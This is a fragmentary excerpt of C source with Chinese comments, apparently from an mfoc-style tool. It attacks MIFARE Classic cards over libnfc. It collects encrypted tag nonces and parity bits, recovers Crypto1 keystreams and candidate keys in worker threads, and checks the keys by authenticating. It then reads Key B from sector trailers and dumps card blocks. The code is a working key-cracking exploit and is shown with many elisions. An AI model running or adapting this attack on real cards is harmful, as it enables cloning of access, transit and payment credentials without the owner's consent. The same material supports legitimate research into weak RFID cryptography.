...
bool get_rats_is_2k(mftag t, mfreader r) {
    ...
    if (res >= 10) {
        printf("ATS %02X%02X%02X%02X%02X|%02X%02X%02X%02X%02X\n", res, abtRx[0], abtRx[1], abtRx[2],
               abtRx[3], abtRx[4], abtRx[5], abtRx[6], abtRx[7], abtRx[8]);
...
static int mf_distance_get(int e_sector, mftag t, mfreader r, denonce* d) {
    ...
    if (nfc_initiator_transceive_bytes(r.pdi, Auth, 4, Rx, sizeof(Rx), 0) < 0) {
        nfc_perror(r.pdi, "Error while requesting plain tag-nonce\n");
        //exit(EXIT_FAILURE);
        return -1;
    }
    ...
    int res;
    if (((res = nfc_initiator_transceive_bits(r.pdi, ArEnc, 64, ArEncPar, Rx, sizeof(Rx), RxPar)) <
         0) || (res != 32)) {
        ERR("1 Reader-answer transfer error, exiting..");
        //exit(EXIT_FAILURE);
        return -1;
    }
    ...
    for (m = 0; m < d->num_distances; m++) {
        ...
        if (nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar, Rx, sizeof(Rx),
                                          RxPar) < 0) {
        ...
        if (((res = nfc_initiator_transceive_bits(r.pdi, ArEnc, 64, ArEncPar, Rx, sizeof(Rx),
                                                  RxPar)) < 0) || (res != 32)) {
            ERR("2 Reader-answer transfer error, exiting..");
            //exit(EXIT_FAILURE);
            return -1;
        }
...
static int mf_probes_get(int e_sector, int a_sector, mftag t, mfreader r, denonce* d, countKPs* ckp, bool dumpKeysA) {
    struct Crypto1State* pcs = NULL;
    ...
    if (nfc_initiator_transceive_bits(r.pdi, AuthEnc, 32, AuthEncPar, Rx, sizeof(Rx), RxPar) <
        0) {
    ...
    uint8_t parity[3] = { 0x00 };

    // Parity validity check
    for (i = 0; i < 3; ++i) {
        parity[i] = (oddparity(Rx[i]) != RxPar[i]);
    }
    ...
    // Number of probes
    int count_probe_max = ((d->median + d->tolerance) - (d->median - d->tolerance)) / 2;
    int count_probe_valid = 0;

    // Allocate memory to store probe and keys stream
    ks1Probe* kps = malloc(sizeof(ks1Probe) * count_probe_max);
    if (kps == NULL) {
        printf("Can't allocate memory to store probe and keys stream");
        return 0;
    }

    // start probe on loop
    for (i = 0; i < count_probe_max; ++i) {

        // Try to recover the keystream1
        Ks1 = NtEnc ^ NtProbe;

        // Skip this nonce after invalid 3b parity check
        if (is_valid_nonce(NtProbe, NtEnc, Ks1, parity)) {

            // only store, we need start recovery task on subthread.
            kps[count_probe_valid].nt_probe = NtProbe;
            kps[count_probe_valid].ks1 = Ks1;
    ...
    if (count_probe_valid == 0) {
        // printf("没有发现有效的探针！\n");
        return 0;
    }

    // 重新分配内存，在有效探针减少时
    if (count_probe_valid < count_probe_max) {
        // printf("\n发现有效探针减少，将自动裁剪内存空间。");
        ks1Probe* tmp = realloc(kps, count_probe_valid * sizeof(ks1Probe));
        if (tmp == NULL) {
            printf("\n重新分配探针内存失败！\n");
            exit(EXIT_FAILURE);
        }
    ...
    // save probe result to external
    if (ckp->count == 0) {
        ckp->kps = kps;
        ckp->count = count_probe_valid;
    } else {
        // append to prev session result end.
        ks1Probe* tmp = realloc(ckp->kps, sizeof(ks1Probe) * (ckp->count + count_probe_valid));
        if (tmp == NULL) {
            printf("\n重新分配探针内存失败！\n");
            exit(EXIT_FAILURE);
        }
        memcpy(tmp + ckp->count, kps, sizeof(ks1Probe) * count_probe_valid);
        ckp->kps = tmp;
        ckp->count += count_probe_valid;
    }
...
#endif
#endif
* mf_recover_key(void* par) {
    recover_thread_par* pars = (recover_thread_par*)par;
    ...
    for (i = 0; i < pars->rp_count; ++i) {
        recover_par* par = &pars->rp[i];
        kcount = 0;
        // printf("初始化密钥数: %d %d\n", par->key_count, kcount);

        // And finally recover the first 32 bits of the key
        revstate = lfsr_recovery32(par->kp.ks1, par->kp.nt_probe ^ pars->authuid);
        if (revstate_start == NULL) {
            revstate_start = revstate;
        }

        while ((revstate->odd != 0x0) || (revstate->even != 0x0)) {
            lfsr_rollback_word(revstate, par->kp.nt_probe ^ pars->authuid, 0);
            crypto1_get_lfsr(revstate, &lfsr);
            // Allocate a new space for keys
            if (((kcount % MEM_CHUNK) == 0) || (kcount >= par->key_count)) {
                par->key_count += MEM_CHUNK;
                // printf("New chunk by %d, sizeof %lu\n", kcount, par->key_count * sizeof(uint64_t));
                void* tmp = realloc(par->keys, par->key_count * sizeof(uint64_t));
                if (tmp == NULL) {
                ...
                par->keys = (uint64_t*)tmp;
            }
            par->keys[kcount] = lfsr;
            kcount++;
            revstate++;
        }
        free(revstate_start);
        ...
        if (kcount != 0) {
            par->key_count = --kcount;
            if ((par->keys = (uint64_t*)realloc((void*)par->keys,
                                                par->key_count * sizeof(uint64_t))) == NULL) {
                ERR("Memory allocation error for pk->possibleKeys");
                //exit(EXIT_FAILURE);
                return -1;
            }
        ...
        // printf("第%d轮计算密钥完成，获取到的密钥数: %d\n", i, par->key_count);
    }

    printf(".");
}

static void mf_recover_fn(uint32_t authuid, countKPs* ckps, pKeys* pk) {
    // start recover on subthread
    int count_thread = (ckps->count / DEFAULT_PROBE_SPILT) +
                       (ckps->count % DEFAULT_PROBE_SPILT > 0 ? 1 : 0);

    int start_index = 0, i = 0, j = 0;
    bool is_probe_end = false;

    recover_thread_par* rtp = malloc(count_thread * sizeof(recover_thread_par));

    for (i = 0, j = 0; i <= ckps->count && !is_probe_end; ++j) {
        start_index = i;
        if (i + DEFAULT_PROBE_SPILT >= ckps->count) {
            i += (ckps->count - i);
            is_probe_end = true;
        }
        else {
            i += DEFAULT_PROBE_SPILT;
        }

        // printf("启动索引: %d, 结束索引: %d\n", start_index, i);

        rtp[j].rp_count = i - start_index;
        rtp[j].authuid = authuid;
        rtp[j].rp = malloc(rtp[j].rp_count * sizeof(recover_par));
        if (rtp[j].rp == NULL) {
            printf("分配失败！");
            exit(EXIT_FAILURE);
        }

        for (int k = 0; k < rtp[j].rp_count; ++k) {
            /*rtp[j].rp[k].nt_probe = rps[start_index + k].nt_probe;
            rtp[j].rp[k].ks1 = rps[start_index + k].ks1;

            rtp[j].rp[k].key_count = 0;
            rtp[j].rp[k].keys = NULL;*/

            memcpy(
                    &rtp[j].rp[k].kp,
                    &ckps->kps[start_index + k],
                    sizeof(ks1Probe)
            );
    ...
    pthread_t* thread_recover = malloc(count_thread * sizeof(pthread_t));
    for (i = 0; i < count_thread; ++i) {
        pthread_create(&thread_recover[i], NULL, mf_recover_key, &rtp[i]);
    }
    for (i = 0; i < count_thread; ++i) {
    ...
    // 计算线程完成任务后，我们需要进行密钥的收集统一！
    int kcount = pk->size;
    for (i = 0; i < count_thread; ++i) {
        // printf("线程%d的探针个数是%d\n", i, rtp[i].rp_count);
        for (int k = 0; k < rtp[i].rp_count; ++k) {
            // 尝试重新分配内存！
            int key_count = rtp[i].rp[k].key_count;
            if (key_count > 0) {
                // printf("内存数量: %d\n", (kcount + rtp[i].rp[k].key_count) * sizeof(uint64_t));
                pk->possibleKeys = realloc(pk->possibleKeys, (kcount + key_count) * sizeof(uint64_t));
                if (pk->possibleKeys == NULL) {
                    printf("在统计子线程的密钥集时分配内存失败！");
                    exit(EXIT_FAILURE);
                }
                // 进行数据拷贝！
                // printf("子线程计算出的密钥总数: %d\n", rtp[i].rp[k].key_count);
                memcpy(
                        pk->possibleKeys + kcount,  // 地址偏移，自动帮忙计算uint64_t的偏移，不需要我们乘以字节数！
                        rtp[i].rp[k].keys,  // 源密钥地址
                        key_count * sizeof(uint64_t) // 拷贝的总字节数
                );
                // 统计总共的密钥数！
                kcount += key_count;
                // printf("密钥拷贝完成！\n");
                free(rtp[i].rp[k].keys);  // 谨记释放子线程计算的结果缓存！
                // printf("内存释放完成！\n\n");
            }
        }
    }
...
int is_valid_nonce(uint32_t Nt, uint32_t NtEnc, uint32_t Ks1, uint8_t* parity) {
    return ((odd_parity((Nt >> 24) & 0xFF) ==
             ((parity[0]) ^ odd_parity((NtEnc >> 24) & 0xFF) ^ BIT(Ks1, 16))) & \
        (odd_parity((Nt >> 16) & 0xFF) ==
         ((parity[1]) ^ odd_parity((NtEnc >> 16) & 0xFF) ^ BIT(Ks1, 8))) & \
        (odd_parity((Nt >> 8) & 0xFF) ==
         ((parity[2]) ^ odd_parity((NtEnc >> 8) & 0xFF) ^ BIT(Ks1, 0)))) ? 1 : 0;
}
...
int main(int argc, char* const argv[]) {
    ...
    */
    ...
    // Initialize pKeys
    if ((pk = malloc(sizeof(pKeys))) == NULL) {
    ...
    // Initialize threads
    recovery_thread = malloc(sizeof(pthread_t) * sets);
    if (recovery_thread == NULL) {
        ERR("Cannot allocate memory for pthread_t");
        goto error;
    }

    // Initialize ckps
    if ((ckps = malloc(sizeof(countKPs))) == NULL) {
        ERR("Cannot allocate memory for ckps");
        goto error;
    }
    ckps->count = 0;
    ...
    memcpy(mp.mpa.abtAuthUid, t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4,
           sizeof(mp.mpa.abtAuthUid));
                ...
                if (!t.sectors[i].foundKeyA) {
                    ...
                    if ((res = nfc_initiator_mifare_cmd(r.pdi, mc, block, &mp)) < 0) {
                        ...
                        if (!t.sectors[i].foundKeyB) {
                            if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_READ, block, &mtmp)) >=
                                0) {
                                ...
                                memcpy(mtmp.mpa.abtKey, mtmp.mpd.abtData + 10,
                                       sizeof(mtmp.mpa.abtKey));
                                memcpy(mtmp.mpa.abtAuthUid,
                                       t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4,
                                       sizeof(mtmp.mpa.abtAuthUid));
                                if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_AUTH_B, block,
                                                                    &mtmp)) < 0) {
                                    ...
                                    //fprintf(stdout, "OK\n");
                                    memcpy(t.sectors[i].KeyB, mtmp.mpd.abtData + 10,
                                           sizeof(t.sectors[i].KeyB));
                                    t.sectors[i].foundKeyB = true;
                                    bk->size++;
                                    bk->brokenKeys = (uint64_t*)realloc((void*)bk->brokenKeys,
                                                                        bk->size *
                                                                        sizeof(uint64_t));
                                    bk->brokenKeys[bk->size - 1] = bytes_to_num(mtmp.mpa.abtKey,
                                                                                sizeof(mtmp.mpa.abtKey));
                                }
                            }
                            else {
    ...
    for (i = 0; i < (t.num_sectors); ++i) {
        if (t.sectors[i].foundKeyA) {
            fprintf(stdout, "Sector %02d - Found   Key A: %012llx ", i,
                    bytes_to_num(t.sectors[i].KeyA, sizeof(t.sectors[i].KeyA)));
        ...
        for (j = 0; j < (t.num_sectors); ++j) {
            ...
            if ((dumpKeysA && !t.sectors[j].foundKeyA) || (!dumpKeysA && !t.sectors[j].foundKeyB)) {
                ...
                for (uint32_t o = 0; o < bk->size; o++) {
                    ...
                    int res;
                    if ((res = nfc_initiator_mifare_cmd(r.pdi, mc, t.sectors[j].trailer, &mp)) <
                        0) {
                        if (res != NFC_EMFCAUTHFAIL) {
                            nfc_perror(r.pdi, "nfc_initiator_mifare_cmd");
                            goto error;
                        ...
                        if (dumpKeysA) {
                            ...
                            if (!t.sectors[j].foundKeyB) {
                                if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_READ,
                                                                    t.sectors[j].trailer, &mtmp)) >=
                                    0) {
                                    fprintf(stdout,
                                            "  Data read with Key A revealed Key B: [%012llx] - checking Auth: ",
                                            bytes_to_num(mtmp.mpd.abtData + 10,
                                                         sizeof(mtmp.mpa.abtKey)));
                                    memcpy(mtmp.mpa.abtKey, mtmp.mpd.abtData + 10,
                                           sizeof(mtmp.mpa.abtKey));
                                    memcpy(mtmp.mpa.abtAuthUid,
                                           t.nt.nti.nai.abtUid + t.nt.nti.nai.szUidLen - 4,
                                           sizeof(mtmp.mpa.abtAuthUid));
                                    if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_AUTH_B,
                                                                        t.sectors[j].trailer,
                                                                        &mtmp)) < 0) {
                                        fprintf(stdout, "Failed!\n");
                                        mf_configure(r.pdi);
                                        ...
                                        fprintf(stdout, "OK\n");
                                        memcpy(t.sectors[j].KeyB, mtmp.mpd.abtData + 10,
                                               sizeof(t.sectors[j].KeyB));
                                        t.sectors[j].foundKeyB = true;
                                        bk->size++;
                                        bk->brokenKeys = (uint64_t*)realloc(
                                                (void*)bk->brokenKeys,
                                                bk->size * sizeof(uint64_t));
                                        bk->brokenKeys[bk->size - 1] = bytes_to_num(mtmp.mpa.abtKey,
                                                                                    sizeof(mtmp.mpa.abtKey));
                                    }
                                }
                ...
                for (k = 0; k < probes; ++k) {
                    ...
                    // AUTH + Get Distances mode
                    if (mf_distance_get(e_sector, t, r, &d) == -99999) {
                        //for now we return the last sector that is unknown
                        nfc_close(r.pdi);
                        nfc_exit(context);
                        if (pfKey) {
                            fprintf(pfKey, "%012llx;%d;%c;%d;%c", knownKey, knownSector,
                                    knownKeyLetter, unknownSector, unknownKeyLetter);
                            fclose(pfKey);
                        }
                        return 9;
                    }

                    printf("Sector: %d, type %c, probe %d, distance %d ", j,
                           (dumpKeysA ? 'A' : 'B'), k, d.median);
                    ...
                    // AUTH + Get probe mode
                    // 为了减少CPU占用而导致的通信过程复杂度增加，我们在单线程内进行
                    // 探针收集，以此获得更加稳定的通信时序控制效果
                    for (n = 0; n < sets; n++) {
                        mf_probes_get(e_sector, t.sectors[j].trailer, t, r, &d, ckps, dumpKeysA);
                    }
                    ...
                    // 在此函数中创建子线程进行大量运算
                    mf_recover_fn(
                            t.authuid,   // 卡片的UID，将被用来做运算，非常重要
                            ckps,   // 存放多个ks1和probe的结构体
                            pk  // 存放最终计算出来的有可能的密钥集
                    );
                    ...
                    if (ck == NULL) {
                        ERR("Cannot allocate memory for ck on uniqsort.");
                        exit(EXIT_FAILURE);
                    }
                    for (i = 0; i < TRY_KEYS; i++) {
                        ...
                        if (ck[i].count > 0) {
                            ...
                            mc = dumpKeysA ? MC_AUTH_A : MC_AUTH_B;
                            int res;
                            if ((res = nfc_initiator_mifare_cmd(r.pdi, mc, t.sectors[j].trailer,
                                                                &mp)) < 0) {
                                if (res != NFC_EMFCAUTHFAIL) {
                                    nfc_perror(r.pdi, "nfc_initiator_mifare_cmd");
                                    goto error;
                                ...
                                bk->brokenKeys = (uint64_t*)realloc((void*)bk->brokenKeys,
                                                                    bk->size * sizeof(uint64_t));
                                bk->brokenKeys[bk->size - 1] = bytes_to_num(mp.mpa.abtKey,
                                    ...
                                    if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_READ,
                                        ...
                                        if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_AUTH_B,
                                            ...
                                            bk->brokenKeys = (uint64_t*)realloc(
                                                    (void*)bk->brokenKeys,
                                                    bk->size * sizeof(uint64_t));
                                            bk->brokenKeys[bk->size - 1] = bytes_to_num(
                                                    mtmp.mpa.abtKey, sizeof(mtmp.mpa.abtKey));
                                        }
                                    }
                                    else {
                                        if (res != NFC_ERFTRANS) {
                    ...
                    if ((dumpKeysA && t.sectors[j].foundKeyA) ||
                        (!dumpKeysA && t.sectors[j].foundKeyB))
                        break;
                }
        ...
        for (block = t.num_blocks; block >= 0; block--) {
            ...
            if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_AUTH_A, block, &mp)) < 0) {
                ...
                if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_READ, block, &mp)) >= 0) {
                    fprintf(stdout, "Block %02d, type %c, key %012llx :", block, 'A',
                            bytes_to_num(t.sectors[i].KeyA, 6));
                    ...
                    if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_AUTH_B, block, &mp)) < 0) {
                        ...
                        if ((res = nfc_initiator_mifare_cmd(r.pdi, MC_READ, block, &mp)) >= 0) {
                            fprintf(stdout, "Block %02d, type %c, key %012llx :", block, 'B',
                                    bytes_to_num(t.sectors[i].KeyB, 6));
                            print_hex(mp.mpd.abtData, 16);
                            mf_configure(r.pdi);
                            mf_select_tag(r.pdi, &(t.nt));
                            failure = false;
